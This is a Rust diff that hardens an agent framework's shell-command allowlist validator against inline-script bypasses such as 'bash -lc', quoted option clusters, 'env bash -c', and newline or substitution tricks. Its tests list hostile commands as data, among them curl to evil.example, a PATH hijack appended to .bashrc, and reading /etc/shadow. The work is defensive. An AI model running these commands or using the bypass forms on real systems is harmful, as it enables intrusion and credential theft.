@@ -284,26 +284,8 @@ use librefang_types::config::{ExecPolicy, ExecSecurityMode};
 ///   denylist is a one-line bypass for any allowlisted outer
 ///   binary (`echo`, `cat`, `awk`, …).
 pub fn contains_shell_metacharacters(command: &str) -> Option<String> {
-    // First, check characters that are dangerous even inside quotes:
-    // newlines and null bytes break the command boundary regardless of quoting.
-    if command.contains('\n') || command.contains('\r') {
-        return Some("embedded newline".to_string());
-    }
-    if command.contains('\0') {
-        return Some("null byte".to_string());
-    }
-
-    // ── Command substitution + variable expansion ─────────────────────
-    // These fire inside double quotes too — scan the RAW string.
-    // Audit: shell-meta-double-quote-bypass.
-    if command.contains('`') {
-        return Some("backtick command substitution".to_string());
-    }
-    if command.contains("$(") {
-        return Some("$() command substitution".to_string());
-    }
-    if command.contains("${") {
-        return Some("${} variable expansion".to_string());
+    if let Some(reason) = contains_quote_independent_metacharacters(command) {
+        return Some(reason);
     }
 
     // The remaining metacharacters (`;`, `|`, `>`, `<`, `{`, `}`,
@@ -334,6 +316,33 @@ pub fn contains_shell_metacharacters(command: &str) -> Option<String> {
     // ── Background execution and logical chaining ──────────────────────
     if unquoted.contains('&') {
         return Some("ampersand operator".to_string());
+    }
+    None
+}
+
+/// The part of [`contains_shell_metacharacters`] that does not depend on quoting: characters a shell acts on even inside a quoted inline script.
+///
+/// Newlines and NUL bytes end the command regardless of quoting, and backtick, `$(` and `${` expand inside double quotes.
+/// The inline-script inspection splits a script on whitespace and on the sequencing operators only, so a newline-separated or substituted command would otherwise be invisible to it.
+fn contains_quote_independent_metacharacters(command: &str) -> Option<String> {
+    if command.contains('\n') || command.contains('\r') {
+        return Some("embedded newline".to_string());
+    }
+    if command.contains('\0') {
+        return Some("null byte".to_string());
+    }
+
+    // ── Command substitution + variable expansion ─────────────────────
+    // These fire inside double quotes too — scan the RAW string.
+    // Audit: shell-meta-double-quote-bypass.
+    if command.contains('`') {
+        return Some("backtick command substitution".to_string());
+    }
+    if command.contains("$(") {
+        return Some("$() command substitution".to_string());
+    }
+    if command.contains("${") {
+        return Some("${} variable expansion".to_string());
     }
     None
 }
@@ -593,6 +602,13 @@ fn inspect_shell_wrapper_inner(command: &str, depth: usize) -> ShellWrapperInspe
     let base_lower = base.to_lowercase();
     let base_normalized = base_lower.strip_suffix(".exe").unwrap_or(&base_lower);
     if !SHELL_WRAPPERS.contains(&base_normalized) {
+        // `env bash -c "…"` / `nohup sh -c "…"`: a prefix wrapper hands the rest of the line to the command it names, so when that command is a shell wrapper its inline script needs the same inspection as a bare `bash -c`.
+        // `env` is a default safe_bin, so without this an allowlisted `bash` would accept any script behind an `env` prefix.
+        if let Ok(Some(inner)) = inspect_prefix_wrapper(trimmed) {
+            if let Some(tail) = suffix_starting_at(trimmed, inner) {
+                return inspect_shell_wrapper_inner(tail, depth + 1);
+            }
+        }
         return ShellWrapperInspection::NotWrapper;
     }
 
@@ -642,7 +658,99 @@ fn inspect_shell_wrapper_inner(command: &str, depth: usize) -> ShellWrapperInspe
         }
     }
 
+    // Forms the exact-match table cannot express: POSIX short-option clusters that include `c` (`bash -lc`, `sh -ec`, `zsh -xc`) and cmd's `/k`, all of which execute the next argument as a script.
+    // Without this the wrapper classifies as `WrapperNoInline`, only the outer base is allowlist-checked, and the quoted script runs unvalidated.
+    let is_posix_shell = matches!(base_normalized, "bash" | "sh" | "zsh");
+    let mut option_value_pending = false;
+    for (i, arg) in args.iter().enumerate() {
+        if is_posix_shell {
+            // The word after `-o` / `-O` / `--rcfile` is that option's value, not the script operand, so it neither ends the option scan nor is an option itself.
+            if std::mem::take(&mut option_value_pending) {
+                continue;
+            }
+            // The calling shell removes quotes and backslashes before the wrapper parses its options, so `-l'c'`, `-"c"`, `-l\c` or `'-c'` reach bash as an option cluster.
+            // The cluster cannot be read reliably from the raw text, so refuse it rather than miss an inline script.
+            if is_shell_quoted_option(arg) {
+                return ShellWrapperInspection::WrapperOpaque(format!(
+                    "quoted or escaped option '{arg}'"
+                ));
+            }
+            // Options end at `--`, at a lone `-`, or at the first operand (the script file).
+            // Words after the operand are the script's positional parameters, which bash never parses as its own options, so `bash run.sh --name="x"` must not be read as a quoted option.
+            if *arg == "--" || *arg == "-" || !(arg.starts_with('-') || arg.starts_with('+')) {
+                break;
+            }
+            option_value_pending = posix_shell_option_takes_value(arg);
+        }
+        if is_clustered_inline_flag(base_normalized, arg) && i + 1 < args.len() {
+            let joined = args[i + 1..].join(" ");
+            let script = strip_outer_quotes(&joined);
+            return inspect_inner_script(script, depth + 1);
+        }
+        // cmd also accepts the script glued to the switch (`/cdir`, `/c"curl …"`).
+        if base_normalized == "cmd" && arg.len() > 2 {
+            let switch = arg.get(..2).map(str::to_ascii_lowercase);
+            if matches!(switch.as_deref(), Some("/c") | Some("/k")) {
+                let joined = std::iter::once(&arg[2..])
+                    .chain(args[i + 1..].iter().copied())
+                    .collect::<Vec<_>>()
+                    .join(" ");
+                let script = strip_outer_quotes(&joined);
+                return inspect_inner_script(script, depth + 1);
+            }
+        }
+    }
+
     ShellWrapperInspection::WrapperNoInline
+}
+
+/// The rest of `haystack` starting at `part`, which must be a subslice of it.
+///
+/// `inspect_prefix_wrapper` returns the wrapped command as a slice of the segment it parsed, so its address locates where that command starts.
+fn suffix_starting_at<'a>(haystack: &'a str, part: &str) -> Option<&'a str> {
+    let start = (part.as_ptr() as usize).checked_sub(haystack.as_ptr() as usize)?;
+    haystack.get(start..)
+}
+
+/// True when `arg` holds quoting or escaping that the calling shell would strip before a POSIX-shell wrapper sees it, and what remains after stripping is an option word (`-…` or `+…`).
+///
+/// This covers both `-l'c'` (quoting inside the cluster) and `'-c'` / `\-c` (quoting before the dash), which the wrapper receives as `-lc` and `-c`.
+fn is_shell_quoted_option(arg: &str) -> bool {
+    const QUOTING: [char; 4] = ['\'', '"', '\\', '$'];
+    if !arg.contains(QUOTING) {
+        return false;
+    }
+    let unquoted: String = arg.chars().filter(|c| !QUOTING.contains(c)).collect();
+    (unquoted.starts_with('-') || unquoted.starts_with('+')) && unquoted.len() > 1
+}
+
+/// True when the POSIX-shell option word `arg` consumes the following word as its value (`-o pipefail`, `-O extglob`, `--rcfile file`, or a cluster ending in one of those, such as `-eo pipefail`).
+fn posix_shell_option_takes_value(arg: &str) -> bool {
+    if let Some(long) = arg.strip_prefix("--") {
+        return matches!(long, "rcfile" | "init-file");
+    }
+    arg.get(1..)
+        .is_some_and(|cluster| cluster.contains(['o', 'O']))
+}
+
+/// True when `arg` makes `wrapper` run the following argument as an inline script through a form that `SHELL_INLINE_FLAGS` does not list exactly.
+///
+/// For bash/sh/zsh this is a single-dash cluster of short options that contains `c` (`-lc`, `-ec`, `-xc`, `-ic`), or the same cluster with a `+` prefix, which bash also accepts (`bash +c "…"` runs the script).
+/// For cmd this is `/k` (run the command, keep the shell open), in either case.
+fn is_clustered_inline_flag(wrapper: &str, arg: &str) -> bool {
+    match wrapper {
+        "bash" | "sh" | "zsh" => {
+            let Some(cluster) = arg.strip_prefix('-').or_else(|| arg.strip_prefix('+')) else {
+                return false;
+            };
+            !cluster.starts_with(['-', '+'])
+                && !cluster.is_empty()
+                && cluster.chars().all(|c| c.is_ascii_alphabetic())
+                && cluster.contains('c')
+        }
+        "cmd" => arg.eq_ignore_ascii_case("/k"),
+        _ => false,
+    }
 }
 
 /// Walk an inline script, recursively inspecting each segment.
@@ -660,6 +768,15 @@ fn inspect_inner_script(script: &str, depth: usize) -> ShellWrapperInspection {
         let seg = seg.trim();
         if seg.is_empty() {
             continue;
+        }
+        // Allowlist mode forbids I/O redirection at top level; an inline script must not be a way around that.
+        // The outer metacharacter scan cannot see these because the whole script sits inside quotes, so scan each segment with its own quoted regions stripped.
+        let unquoted = strip_quoted_regions(seg);
+        if unquoted.contains('>') || unquoted.contains('<') {
+            return ShellWrapperInspection::WrapperOpaque(format!(
+                "I/O redirection in inline script segment '{}'",
+                crate::str_utils::safe_truncate_str(seg, 80)
+            ));
         }
         // Recurse: if this segment is itself a shell wrapper invocation,
         // its own inner payload must also be inspected — or rejected when
@@ -988,12 +1105,17 @@ pub fn validate_command_allowlist(command: &str, policy: &ExecPolicy) -> Result<
 
             let is_shell_wrapper = matches!(inspection, ShellWrapperInspection::WrapperInline(_));
 
-            if !is_shell_wrapper {
-                if let Some(reason) = contains_shell_metacharacters(command) {
-                    return Err(format!(
-                        "Command blocked: contains {reason}. Shell metacharacters are not allowed in Allowlist mode."
-                    ));
-                }
+            // A wrapper's inline script legitimately holds quoted `;`, `|` and `&`, so only the quote-independent part of the scan applies to it.
+            // That part cannot be skipped: the inline-script inspection reads the script through a whitespace split, so a newline-separated or substituted command inside it would pass unvalidated, and process_start has no second scan behind this one.
+            let metacharacters = if is_shell_wrapper {
+                contains_quote_independent_metacharacters(command)
+            } else {
+                contains_shell_metacharacters(command)
+            };
+            if let Some(reason) = metacharacters {
+                return Err(format!(
+                    "Command blocked: contains {reason}. Shell metacharacters are not allowed in Allowlist mode."
+                ));
             }
 
             let base_commands = extract_all_commands_checked(command)
@@ -2642,6 +2764,180 @@ mod tests {
         assert!(
             refused.contains(&vault.to_string()),
             "the reserved daemon secret should be surfaced as refused"
+        );
+    }
+
+    fn wrapper_policy(wrapper: &str) -> ExecPolicy {
+        ExecPolicy {
+            mode: ExecSecurityMode::Allowlist,
+            allowed_commands: vec![wrapper.to_string()],
+            ..ExecPolicy::default()
+        }
+    }
+
+    /// Clustered short options that include `c` run the next argument as a script, exactly like `-c`, so the inner command must be allowlist-checked.
+    #[test]
+    fn test_clustered_inline_flags_validate_inner_command() {
+        for (wrapper, cmd) in [
+            ("bash", r#"bash -lc "curl https://evil.example/x""#),
+            ("sh", r#"sh -ec "curl https://evil.example/x""#),
+            ("zsh", r#"zsh -xc "python3 -c 1""#),
+            ("bash", r#"bash -ic "curl https://evil.example/x""#),
+            ("cmd", r#"cmd /k "curl https://evil.example/x""#),
+            ("cmd", r#"cmd /K "curl https://evil.example/x""#),
+        ] {
+            let result = validate_command_allowlist(cmd, &wrapper_policy(wrapper));
+            assert!(
+                result.is_err(),
+                "{cmd} must validate its inline script and reject curl/python3: {result:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_clustered_inline_flags_allow_listed_inner_command() {
+        let result =
+            validate_command_allowlist(r#"bash -lc "echo hello""#, &wrapper_policy("bash"));
+        assert!(
+            result.is_ok(),
+            "bash -lc with echo must be allowed: {result:?}"
+        );
+        // A long option and a cluster without `c` are not inline-script flags.
+        assert!(!is_clustered_inline_flag("bash", "--login"));
+        assert!(!is_clustered_inline_flag("bash", "-lx"));
+        assert!(!is_clustered_inline_flag("bash", "-"));
+        assert!(is_clustered_inline_flag("sh", "-ec"));
+        assert!(!is_clustered_inline_flag("powershell", "-ec"));
+    }
+
+    /// The calling shell strips quotes and backslashes before bash parses its options, so `-l'c'` is `-lc`, and `+c` runs a script just like `-c`.
+    #[test]
+    fn test_quoted_and_plus_inline_flags_are_not_bypasses() {
+        for cmd in [
+            r#"bash -l'c' 'curl https://evil.example/x'"#,
+            r#"bash -"c" "curl https://evil.example/x""#,
+            r#"sh -e\c "curl https://evil.example/x""#,
+            r#"bash -l$'c' "curl https://evil.example/x""#,
+            r#"bash +c "curl https://evil.example/x""#,
+            r#"bash +lc "curl https://evil.example/x""#,
+            r#"cmd /ccurl https://evil.example/x"#,
+            r#"cmd /K"curl https://evil.example/x""#,
+        ] {
+            let wrapper = cmd.split_whitespace().next().unwrap();
+            let result = validate_command_allowlist(cmd, &wrapper_policy(wrapper));
+            assert!(result.is_err(), "{cmd} must not run curl: {result:?}");
+        }
+        let result = validate_command_allowlist(r#"bash +c "echo hi""#, &wrapper_policy("bash"));
+        assert!(
+            result.is_ok(),
+            "an allowed script stays allowed: {result:?}"
+        );
+    }
+
+    /// `env` is a default safe_bin: `env bash -c "…"` must inspect bash's script exactly like `bash -c "…"`.
+    #[test]
+    fn test_prefix_wrapper_does_not_hide_shell_inline_script() {
+        let mut policy = wrapper_policy("bash");
+        policy.allowed_commands.push("nohup".to_string());
+        for cmd in [
+            r#"env bash -c "curl https://evil.example/x""#,
+            r#"env FOO=1 /bin/bash -lc "curl https://evil.example/x""#,
+            r#"env env bash -c "curl https://evil.example/x""#,
+            r#"nohup bash -c "curl https://evil.example/x""#,
+            r#"env bash -c "echo x > /tmp/f""#,
+        ] {
+            let result = validate_command_allowlist(cmd, &policy);
+            assert!(
+                result.is_err(),
+                "{cmd} must validate the inner script: {result:?}"
+            );
+        }
+        let result = validate_command_allowlist(r#"env bash -c "echo hi""#, &policy);
+        assert!(
+            result.is_ok(),
+            "an allowed script stays allowed: {result:?}"
+        );
+        // A prefix wrapper around a non-shell command is unaffected.
+        let result = validate_command_allowlist("env echo hi", &policy);
+        assert!(result.is_ok(), "{result:?}");
+    }
+
+    /// The inline-script inspection reads the script through a whitespace split, so a newline-separated or substituted command inside a wrapper's script must be refused by the validator itself.
+    /// process_start has no second metacharacter scan behind `validate_command_allowlist`, so this is the only gate for it.
+    #[test]
+    fn test_inline_script_newline_and_substitution_blocked() {
+        let policy = wrapper_policy("bash");
+        for cmd in [
+            "env bash -c \"echo ok\ncurl https://evil.example/p -o /tmp/p\"",
+            "bash -c \"echo ok\ncurl https://evil.example/p\"",
+            "bash -lc \"echo ok\rcurl https://evil.example/p\"",
+            "bash -lc \"echo `curl https://evil.example/p`\"",
+            "env bash -c \"echo $(curl https://evil.example/p)\"",
+            "bash -c \"echo ${PATH}\"",
+        ] {
+            let result = validate_command_allowlist(cmd, &policy);
+            assert!(
+                result.is_err(),
+                "{cmd:?} must not run an unvalidated command: {result:?}"
+            );
+        }
+        // Quoted sequencing inside the script is still validated per segment rather than refused.
+        let result = validate_command_allowlist(r#"bash -c "echo a; echo b""#, &policy);
+        assert!(result.is_ok(), "{result:?}");
+    }
+
+    /// Words after the script operand are the script's positional parameters, so quoting in them is not an option cluster.
+    #[test]
+    fn test_script_operand_arguments_are_not_options() {
+        let policy = wrapper_policy("bash");
+        for cmd in [
+            r#"bash deploy.sh --label="release candidate""#,
+            r#"bash x.sh -m'msg'"#,
+            r#"bash -o pipefail run.sh --name="x""#,
+            r#"bash -- run.sh --name="x""#,
+        ] {
+            let result = validate_command_allowlist(cmd, &policy);
+            assert!(result.is_ok(), "{cmd} must stay allowed: {result:?}");
+        }
+        let result = validate_command_allowlist("sh run.sh --path=$HOME", &wrapper_policy("sh"));
+        assert!(result.is_ok(), "{result:?}");
+        // Quoting before the operand still hides an inline-script flag, including quoting around the dash itself.
+        for cmd in [
+            r#"bash -l'c' 'curl https://evil.example/x'"#,
+            r#"bash '-c' "curl https://evil.example/x""#,
+            r#"bash \-lc "curl https://evil.example/x""#,
+            r#"bash -o pipefail -l'c' "curl https://evil.example/x""#,
+            r#"bash -o pipefail -lc "curl https://evil.example/x""#,
+        ] {
+            let result = validate_command_allowlist(cmd, &policy);
+            assert!(result.is_err(), "{cmd} must not run curl: {result:?}");
+        }
+    }
+
+    /// Redirection inside an inline script must be refused just like it is at top level in allowlist mode.
+    #[test]
+    fn test_inline_script_redirection_blocked() {
+        for cmd in [
+            r#"bash -c "echo 'export PATH=/tmp/evil:$PATH' >> /home/u/.bashrc""#,
+            r#"sh -c "cat < /etc/shadow""#,
+            r#"bash -c "echo x > f""#,
+            r#"cmd /c "echo x > f""#,
+        ] {
+            let wrapper = cmd.split_whitespace().next().unwrap();
+            let result = validate_command_allowlist(cmd, &wrapper_policy(wrapper));
+            assert!(
+                result
+                    .as_ref()
+                    .is_err_and(|e| e.contains("I/O redirection")),
+                "{cmd} must be blocked for I/O redirection: {result:?}"
+            );
+        }
+        // A quoted `>` inside the script is literal text, not a redirection.
+        let result =
+            validate_command_allowlist(r#"bash -c "echo 'a > b'""#, &wrapper_policy("bash"));
+        assert!(
+            result.is_ok(),
+            "quoted '>' is not a redirection: {result:?}"
         );
     }
 }
